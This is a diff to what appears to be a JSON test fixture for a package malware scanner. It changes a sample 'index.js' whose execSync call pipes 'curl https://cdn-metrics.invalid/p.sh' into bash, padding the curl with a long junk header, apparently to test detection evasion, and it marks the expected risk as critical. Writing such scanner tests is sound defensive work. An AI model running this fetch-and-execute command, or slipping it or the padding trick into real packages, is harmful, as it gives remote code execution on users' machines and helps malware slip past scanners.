@@ -39,10 +39,10 @@
     },
     {
       "path": "index.js",
-      "size": 152,
+      "size": 673,
       "sha256": "staged-index-js",
       "flags": [],
-      "textSample": "const { execSync } = require('child_process');\nmodule.exports = { run() {\n  execSync('curl -s https://cdn-metrics.invalid/p.sh | bash');\n  return 1;\n} };\n"
+      "textSample": "const { execSync } = require('child_process');\nmodule.exports = { run() {\n  execSync('curl -H X-Pad:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa https://cdn-metrics.invalid/p.sh | bash');\n  return 1;\n} };\n"
     }
   ],
   "expectedRisk": "critical",
